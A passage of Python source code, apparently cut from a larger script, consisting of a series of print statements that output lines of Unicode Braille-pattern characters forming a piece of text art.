            print('⠀⠀⠀⠀⡀⡤⠔⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠤⠤⢤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣯⣿⣿⠟⠡⢠⣤⠦⡴⢦⣤⣤⣶⡾⢛⣨⢐⡡⠎⢩⣼⡟⣿⠃⠌⡐⠡⡐⠉⠤⡘⣤⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⡀⠁⠄⡐⢠⢁⠢⠄')
            print('⠖⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⣀⣠⣤⣶⡾⢟⣫⣥⣶⣶⣦⣤⣄⡀⠈⠉⠛⠲⢤⣀⠀⠀⠀⢻⣿⣿⠟⠁⣀⣴⣾⣶⣷⣿⣶⣶⣬⣙⢿⣿⠿⢶⠶⠾⠛⢡⣼⠯⠘⡠⢁⠒⡈⢂⣵⠠⣿⡛⠰⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠀⠄⠨⠄⢂⠰⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⢴⡒⠋⠁⠀⠈⢻⣍⠛⠙⠛⠻⠿⣿⣿⣷⣿⠿⠛⠛⠉⠉⠛⠛⠛⠀⠀⠀⠀⠀⠈⠛⢦⣄⣼⠟⠁⠀⠘⠿⠟⠋⠉⠀⠀⠉⠉⠻⢿⣿⣛⢷⡀⣀⣀⣠⣾⠋⡄⢃⠰⠈⢂⡉⠄⣺⣥⡿⠌⡑⢺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠌⠠⠌⠂⠁⠀⠁')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠖⣿⢹⡆⢈⢿⣠⡀⠄⠠⢀⠈⡛⣿⠷⣦⣾⣵⣿⠟⠁⠀⠀⣠⣤⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣶⣄⡀⠀⠀⠻⣿⣾⣷⡿⣿⡋⢄⠢⠐⠌⡠⣹⡞⠣⡔⣿⣾⠃⠆⡡⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠄⠁⠀⠃⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠖⠋⢹⡏⢹⣮⣿⡸⣷⠆⢈⠻⢶⣆⣔⣨⣤⣿⣇⣀⣾⣿⣿⠇⠀⠀⢀⣾⣿⣿⠟⠻⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠟⠀⠉⢿⣿⣷⡄⠀⠀⠘⣿⣆⣠⣾⠿⢶⣮⣵⡶⢟⠣⡀⢅⣺⣿⡧⠉⡔⢠⠉⣿⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⡀⠀⠂⠈⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠁⠀⠀⠀⣿⠄⠁⠌⠛⠛⢽⣮⡀⠐⢀⠈⡉⠍⣷⡄⠈⠙⢿⣿⡏⠀⠀⠀⣾⣿⣿⡇⠀⠀⠸⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⠀⠀⠸⣿⣿⣿⡀⠀⠀⢸⣿⡉⠀⢀⠄⣲⣿⣈⡐⢠⣑⣾⣟⣻⣇⠒⣀⠂⠔⣹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⡈⠀⡁⠌⢀⠿⣿⣢⡀⢰⣴⠷⠚⢷⡄⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⡆⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡄⠀⠀⣸⣿⣿⣿⡇⠀⠀⠘⠿⠁⠀⠌⣼⡏⡉⠙⢿⣿⡿⣽⢮⣳⢇⠢⠀⠜⡐⠸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠉⠄⢀⠂⠀⡀⢌⡻⣜⣻⣷⣿⠇⠀⢠⡙⣧⠀⠀⠈⠁⠀⠀⠀⣿⣿⣿⣷⣄⣠⣼⣯⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠿⢿⣷⣾⣟⢳⡝⢿⠇⠀⠀⠀⠀⠀⠐⣶⣿⡶⠛⠀⠘⣿⣟⣻⣞⡵⣮⠐⡁⠊⠄⡁⢿⡇⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠂⠈⢀⠀⠐⠀⣨⣳⣬⣿⡽⣿⠀⢠⡗⠛⢿⡆⠀⡀⠘⠀⠀⠀⠙⠀⠀⣹⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⢹⡾⠀⠀⠀⠀⠀⠀⢠⡟⠩⢻⡇⠁⢰⣿⣿⣳⢮⠷⣷⡐⠠⢉⡐⢀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀')
            print('⠀⠀⠀⠀⠀⠀⣀⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠐⠀⠂⠄⢀⠈⠄⢲⢣⢿⣟⣞⣿⡆⢹⡇⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠾⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⣾⠁⣀⣼⠇⢀⣾⡿⣿⣯⣞⣟⠧⡄⠑⠤⠐⡠⢈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠧⠀⠂⠄⠂⠀⡀⢠⣟⣮⣿⡽⣼⡿⢷⡀⢽⡤⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⢤⣤⡤⠤⡴⠆⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⡿⠿⠻⠗⠃⠀⠀⠀⠀⠀⠀⢰⡏⠀⠼⠃⢠⣶⣿⣟⣿⣿⡼⣹⠷⡈⠜⡀⠡⠐⠂⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⢀⠂⠀⠁⢀⢰⡿⣸⡿⢼⣹⡇⠈⢷⡄⠀⢀⡀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠸⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⡷⣖⣀⣤⣿⣿⢫⣷⣹⣿⣟⢯⣿⡐⠂⠌⡐⢁⠂⢼⣯⡄⠠⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡇⠀⠌⠀⢀⠠⠀⢀⣿⣱⣿⣏⡞⣿⠀⠀⠀⠻⣖⡯⠗⠈⣇⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢠⡀⠀⠀⠀⠀⠀⣼⢷⣿⣟⠋⠁⣻⣯⡟⣶⢭⢿⣿⡞⣟⣧⠁⢂⠘⠠⡁⡘⣿⡄⠡⢀⢁⠂⢀⠌⠀⠄⠁⠀⢀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⡀⠄⢀⠀⠐⣸⣏⣾⡷⢮⣻⡏⠀⠀⠀⠀⠀⣽⣿⠖⢻⡆⠀⠀⠀⠀⠈⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠈⠀⠀⠀⠀⠀⢴⡏⠈⣻⡁⢀⡀⢸⣿⣽⣧⠿⣺⣿⣏⢷⣏⠄⠡⢈⠰⠐⣀⢻⣿⠀⠆⡀⠢⠀⢆⠈⡠⠀⡀⠀⡀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⠀⠠⠀⠄⠀⡀⢡⣾⣱⣿⢣⡻⣼⠇⠀⠀⠀⣴⣆⣤⣤⣠⣌⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣬⣛⣣⣾⣿⠘⣿⡶⣽⣛⡧⢿⣿⣚⡾⠆⠡⠄⢂⠡⢀⠺⣟⠀⠈⢀⠃⠌⡐⠂⢄⢁⠐⠀⠄⢀⠂⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⡁⡀⠂⢀⠐⡀⣼⣯⣿⣫⡽⣹⣿⠀⠀⠀⠀⠹⣿⣛⣟⣿⠏⠈⢻⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠉⠻⣯⣿⣹⣿⠏⠈⣿⣟⣮⣗⡻⣽⣿⣧⣟⡇⡐⠌⣀⢂⠂⡘⣿⠀⠀⠀⠀⠐⡈⠄⠂⠤⢈⠀⡄⠀⠀⠀')
            print('⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣽⠀⠐⠀⠀⢀⠄⢀⢐⡿⢾⡟⡵⣚⣽⡇⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠈⠉⠉⠀⠀⠀⢻⣟⡶⣭⢗⡧⣿⣷⢾⣵⠀⡐⠠⢀⠂⡐⢻⡄⠀⠀⠀⠀⠐⡈⢂⡁⠂⡐⠀⠌⠀⠀')
            print('⠈⠙⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⡁⠀⠀⠂⠁⠀⢀⢀⣾⣟⣿⡹⣜⣭⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡜⣧⢻⣼⢳⣿⣧⣿⠀⡄⡑⢠⢁⠐⣹⣧⠀⠀⠀⠀⠀⠀⠁⣀⠡⢀⠁⠠⠀⠂')
            print('⠀⠀⠀⠀⠙⠳⣦⣄⡀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⡈⠀⠀⠁⠀⣾⢷⣾⡟⡼⣱⣺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠼⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣜⣣⢟⣲⣛⢿⣯⣿⡁⢂⠐⠠⢀⠂⣈⣿⠀⠀⠀⠀⠀⠀⠀⠀⡀⠂⠄⠀⠀⠄')
            print('⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⣼⡃⠀⠐⠀⠀⠄⠁⠈⢸⣏⣾⠿⣜⡹⡼⣽⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠞⢻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢾⡱⣏⣶⢏⡿⣿⣽⡱⠠⠡⡈⢂⠁⠄⣻⡆⠀⠀⠀⠀⠀⠀⠀⠐⠈⡄⠁⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠶⣦⣤⣄⣀⣼⠇⠀⠀⠈⠀⠐⠀⠐⢠⢻⣼⣟⡳⢎⡵⣫⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠟⠛⠲⢤⣄⣀⣀⢀⣀⣤⡴⠞⠋⠁⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢯⡵⢫⠾⣝⡞⣿⣷⢻⡄⠁⠔⠠⡈⠒⢸⡧⠀⠀⠀⠀⠀⠀⠀⡁⢂⠐⡈⠀⡀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⢶⣶⣤⣀⣡⡴⠶⠛⠛⠻⢾⡿⢿⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣯⡻⣭⠿⡼⣍⡿⣿⢿⡇⣈⠰⠀⠅⡁⢊⣿⠀⠀⠀⠀⠀⠀⠀⠀⠠⢁⡀⠂⠄')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⡄⠀⠀⠀⠀⠀⠈⠢⡀⠉⠻⣶⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡷⣙⢧⣻⡵⢮⡽⣿⣯⡱⢀⠂⡁⢊⠐⡈⢿⡅⠀⠀⠀⠀⠀⠀⠀⡁⠂⠄⡐⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⢱⡀⠀⠘⢿⣿⡿⣷⣿⣟⣿⣿⣷⣶⢶⣦⣤⣤⣤⣤⣀⣄⣀⣀⣀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡹⢮⡝⡾⣽⣚⣽⣯⣧⠁⠢⠄⢁⠢⢀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠄⢃⠠⢀⠁')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠈⢿⣿⢿⣿⣴⢾⣏⣓⣻⢯⢫⢶⣿⣭⣯⣿⢯⣻⣯⣿⡿⢷⣦⣄⣀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠄⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⢫⢷⡹⣝⢮⡳⢾⣿⣿⡈⠔⢈⠂⡐⢂⠸⣯⠀⠀⠀⠀⠀⠀⠁⠄⠃⠐⠀⡀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⢿⣿⡾⣏⣷⣾⡿⣿⢏⣷⢿⡾⡶⢎⣿⠾⣹⣷⡏⣷⢏⣉⠿⣏⠿⣷⡶⣶⣶⣶⣿⣀⣀⣰⣆⣀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⠿⣎⡹⣎⣷⢹⣏⣿⣷⡎⢀⠁⢆⠁⢆⠈⣿⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠈⢷⣛⡿⣟⣯⢿⣽⠿⣞⢯⣗⡟⣯⣞⣟⣻⣹⢿⠿⣼⣭⡻⣌⢿⣜⢷⡹⣿⣿⣯⡝⣫⣿⣿⣻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣯⣻⠼⣝⢮⡳⣏⡞⣿⣿⣆⠡⡈⡄⢌⢀⠊⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠘⣟⣻⣭⣻⣟⣾⡿⣭⢟⡾⣽⠮⣏⢷⣣⡟⢾⣇⠈⠙⠛⠿⢿⣾⣧⣿⣿⣞⡽⢿⡟⣯⣿⢧⣿⣿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣯⡷⣻⣼⣣⢟⡼⣫⣽⣿⣇⠐⡐⢀⡂⢂⠑⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠸⣷⢫⡟⣾⢧⡿⣽⡺⣵⣻⢞⡹⣦⢟⢞⣣⢻⣆⠀⠀⠀⠀⠀⠀⠉⠉⠙⠿⠿⠿⠛⠉⠋⣿⣣⣏⢾⣹⡟⣿⡶⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡷⣟⣵⣫⠷⣏⡿⣧⢻⣿⡇⠌⡠⢁⠤⢁⠂⢼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡄⠘⢿⣺⡜⣯⣳⠿⣝⡧⣟⢮⡳⣭⡛⡼⣜⢣⣟⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⢻⣞⢧⠏⢳⡳⢫⣗⢯⡽⣻⢿⡿⣷⣶⣦⣤⣤⣤⣿⣿⣿⣷⣽⣿⣯⣷⣏⣿⣿⣷⠂⡁⡂⡄⢊⡐⢨⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠉⠛⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠈⢷⣛⡶⣻⡭⣞⣳⣟⡮⡵⠧⡽⡝⣎⢷⡺⡼⣯⡉⠛⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣯⣞⡳⢭⡻⢎⣻⢣⢯⣜⠷⣯⢽⣻⢽⡽⠏⣟⡟⣿⢿⡿⠉⠈⠙⠻⣷⣿⣿⠠⢁⠔⡠⠁⡄⢂⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠉⠙⠳⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⢸⠁⠀⠀⠀⠻⣗⣯⡻⣝⣮⠽⣳⣭⢇⡟⡼⣎⢧⣳⢱⡼⢷⣄⠀⠀⠉⠙⠓⠶⣤⡀⠀⠀⠀⠀⠀⠀⠙⣯⣽⢫⢷⡻⢧⡻⡽⢮⣻⣽⣫⠷⣾⣍⡳⡿⣹⣯⡾⠁⠀⠀⠀⠀⢈⠛⠻⢷⣦⡈⠤⡁⠔⡁⢾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⢸⢿⣵⣩⢯⣟⣧⢛⣾⡹⡴⢏⠶⢇⡯⢖⢧⡝⣿⣄⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⠀⢀⢹⣯⢏⣯⡝⣮⣝⡻⣝⠧⣞⡽⣯⢷⣯⡟⣵⣿⣽⠃⠀⠀⠀⠀⠀⡼⠀⠀⠀⠙⣧⠴⢀⠡⠌⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⣼⠣⠂⠀⠙⠻⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⢰⠁⠀⠀⠀⡘⠁⠀⠀⠀⠀⢠⠏⠀⠙⢾⣯⣽⣾⣛⣮⢟⣝⠾⣍⢧⣭⢛⣎⠶⣍⢻⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠬⣿⣏⠶⣯⢳⡞⣽⠞⣽⢮⡿⣽⣻⢎⣾⢧⡿⠃⠀⠀⠀⠀⠀⣼⣁⣀⠀⠀⠀⡞⠻⣧⣈⠐⢼⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠐⠀⡀⠀⠀⠉⠻⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀⠀⠀⠀⡌⠀⠀⠀⢠⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠙⡿⣯⣝⡻⣟⠿⣿⡿⣿⣶⣯⣞⣭⢖⢯⣜⣛⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⡾⣹⢎⣷⡹⢧⣻⡭⣷⢳⠿⣸⣿⣹⣟⣀⣠⣤⡴⣖⣾⡿⣷⣬⢿⡆⠀⣸⠁⠀⠘⣷⠏⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⣺⠁⠀⠈⠀⠠⠀⠀⢀⠀⢠⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢰⠃⠀⠀⢀⠎⠀⠀⠀⠀⣠⠎⠀⠀⠀⠀⠀⢀⣷⢮⣽⢲⡝⣏⣎⠷⣓⢞⡼⣫⡛⡿⢯⣔⣚⣓⠿⣿⣤⠀⠀⠀⠀⠀⠀⠀⣸⡯⢷⠏⣞⣼⣹⢯⣳⢿⣹⣫⣾⡷⢿⡟⣯⢛⣯⢏⡽⢿⢲⡝⣏⢯⡿⣇⣰⠃⠀⠀⠀⣾⠱⣎⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⢠⡇⠀⠐⠈⢀⠁⠠⠀⠀⠂⣼⡿⢭⡚⡭⣟⣷⣦⣀⠀⠀⠀⠀⣸⠀⠀⢀⡎⠀⠀⠀⡜⠀⠀⠀⢀⡔⠁⠀⠀⠀⠀⠀⠀⢸⡯⣶⢭⡷⣜⢲⣬⣛⡭⠾⡼⣱⣻⡹⢾⣉⠻⣯⣝⣞⣹⣦⠀⠀⠀⠀⠀⡔⣼⣟⣯⢻⣼⢳⢯⡯⢷⣣⣶⡿⢧⡛⣴⢛⣼⣓⣎⣻⣜⢯⡻⣼⣩⢿⡷⡟⠁⠀⠀⠀⣰⣯⠓⣸⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠐⠀⠠⠀⠀⢀⢹⡿⣭⢳⡹⡱⢧⡚⣝⢿⡷⣦⣀⠀⡏⠀⠀⡼⠀⠀⢀⠞⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⢸⡗⣯⡳⣽⢺⡹⢤⡳⢼⡙⡗⢦⢳⣙⢧⢫⡽⡱⣞⢻⢧⣟⣿⣴⠈⠀⡆⢰⣿⡿⣞⢯⢏⡽⣪⣷⡟⡳⡌⣽⣩⠲⡵⣋⠷⣼⣒⠷⣞⣣⢻⣯⣝⡳⣟⡷⠀⠀⢀⡾⠻⣿⡰⢰⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
